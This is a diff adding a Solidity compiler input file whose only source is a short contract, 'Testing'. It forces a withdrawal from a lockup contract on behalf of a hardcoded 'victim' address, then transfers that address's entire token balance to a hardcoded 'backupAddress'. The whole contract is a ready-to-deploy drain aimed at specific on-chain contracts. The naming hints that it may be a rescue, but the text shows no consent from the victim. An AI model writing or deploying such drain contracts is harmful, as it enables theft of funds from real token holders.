@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "unlock.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\ninterface IlockupContract {\n        /** Withdraw a specific locked entry */\n    function withdrawFor(address _staker, uint256 _idx) external;\n}\n\ninterface ITokenContract {\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n     function balanceOf(address account) external view returns (uint256);\n}\n\ncontract Testing {\n    address constant victim = 0xB205AeEEf38A44b4f75d86D4470D5041B7351EC7;\n    address constant lockupContract = 0x879B843868dA248B1F2F53b4f8CC6e17e7E8b949; // OG_TEMPLE_LOCKUP_DO_NOT_FIX\n    address constant tokenContract = 0x654590F810f01B51dc7B86915D4632977e49EA33; // OG_TEMPLE_DO_NOT_FIX\n\n    address backupAddress = 0x2ec96fA3de1D00632DA33a17E0bE58E130C7dC6E;\n\n\n    function withdraw(address _victim) public{\n        IlockupContract(lockupContract).withdrawFor(_victim, 0);\n        ITokenContract token = ITokenContract(tokenContract);\n        uint256 balance = token.balanceOf(victim);\n\n        ITokenContract(tokenContract).transferFrom(victim, backupAddress, balance);\n    }\n}"
+    }
+  }
+}
